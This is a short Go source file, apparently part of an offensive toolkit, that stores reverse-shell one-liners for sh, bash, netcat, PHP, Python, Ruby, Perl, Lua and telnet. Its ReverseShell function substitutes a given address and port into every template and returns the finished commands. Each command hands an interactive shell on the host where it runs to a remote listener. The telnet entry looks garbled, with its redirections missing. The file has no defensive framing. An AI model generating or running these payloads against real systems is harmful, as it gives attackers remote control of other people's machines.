package resh

import (
	"bytes"
	"fmt"
	"strconv"
	"strings"
)

var reshTemplate map[string]string = map[string]string{
	"sh":     `/bin/sh -i >& /dev/tcp/{{ADDR}}/{{PORT}} 0>&1`,
	"bash":   `/bin/bash -i >& /dev/tcp/{{ADDR}}/{{PORT}} 0>&1`,
	"nc":     `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ADDR}} {{PORT}} >/tmp/f`,
	"php":    `php -r '$sock=fsockopen("{{ADDR}}",{{PORT}});exec("/bin/sh -i <&3 >&3 2>&3");'`,
	"python": `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{ADDR}}",{{PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
	"ruby":   `ruby -rsocket -e'f=TCPSocket.open("{{ADDR}}",{{PORT}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
	"perl":   `perl -e 'use Socket;$i="{{ADDR}}";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
	"lua":    `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{{ADDR}}','{{PORT}}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
	"telnet": `rm -f /tmp/p; mknod /tmp/p p && telnet {{ADDR}} {{PORT}} 0/tmp/p`,
}

func ReverseShell(addr string, port int) (string, error) {
	if addr == "" {
		return "", fmt.Errorf("addr is empty")
	}
	var r bytes.Buffer
	for p, v := range reshTemplate {
		r.WriteString(p)
		r.WriteString(":\r\n    ")
		r.WriteString(strings.ReplaceAll(strings.ReplaceAll(v, "{{ADDR}}", addr), "{{PORT}}", strconv.Itoa(port)))
		r.WriteString("\r\n")
	}
	return r.String(), nil
}
